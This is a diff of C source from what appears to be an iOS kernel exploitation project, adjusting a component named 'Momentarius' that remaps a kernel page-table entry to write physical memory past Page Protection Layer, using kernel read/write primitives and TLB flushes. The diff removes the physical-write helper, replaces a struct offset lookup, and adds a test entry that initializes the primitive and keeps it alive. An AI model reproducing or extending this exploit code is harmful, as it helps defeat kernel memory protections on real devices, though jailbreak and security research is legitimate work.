@@ -3,22 +3,11 @@
 #include <string.h>
 #include <time.h>
 
+extern bool ds_is_ready(void);
+extern uint32_t off_task_map;
+
 momentarius_t momentarius = {0};
 volatile bool stop_write = false;
-
-static int momentarius_pplwrite_buf(uint64_t pa, const void *data, size_t size) {
-    if (pa == 0 || data == NULL || size == 0 || momentarius.target_rw_pte == 0) return -1;
-    uint64_t target_page = trunc_page_kernel(pa);   
-    uint64_t target_offset = pa - target_page;
-    
-    kwrite64(momentarius.target_rw_pte, (momentarius.orig_pte & 0xFFFF000000003FFFULL) | target_page);
-    momentarius_tlb_flush();
-    
-    kwritebuf(momentarius.target_rw_mapping + target_offset, data, size);
-    kwrite64(momentarius.target_rw_pte, momentarius.orig_pte);
-    momentarius_tlb_flush();
-    return 0;
-}
 
 static void momentarius_deinit(void) {
     if (KADDR_VALID(momentarius.target_rw_pte)) {
@@ -64,7 +53,7 @@ static int momentarius_init(void) {
     uint64_t kern_task_addr = proc_task(kern_proc_addr);
     if (kern_task_addr == 0) goto err;
     
-    momentarius.kern_vm_map = kread_ptr(kern_task_addr + koffsetof(task, map));
+    momentarius.kern_vm_map = kread_ptr(kern_task_addr + off_task_map);
     if (momentarius.kern_vm_map == 0) goto err;
     uint64_t kern_pmap = kread_ptr(momentarius.kern_vm_map + 0x40);
     if (kern_pmap == 0) goto err;
@@ -117,4 +106,15 @@ static int momentarius_init(void) {
 err:
     momentarius_deinit();
     return -1;
+}
+
+// Experimental entry called by Lara only on the documented A13 / 20G75
+// profile. This reports only that init returned; Lara's existing KRW wrappers
+// cannot independently verify Momentarius' physical PPL-write primitive.
+int momentarius_start_lara_test(void) {
+    if (!ds_is_ready()) return -1;
+    if (momentarius_init() != 0) return -1;
+    // Keep the initialized capability alive for inspection during this app
+    // session. Do not mark it ready: the adapter has no independent PPL probe.
+    return 0;
 }
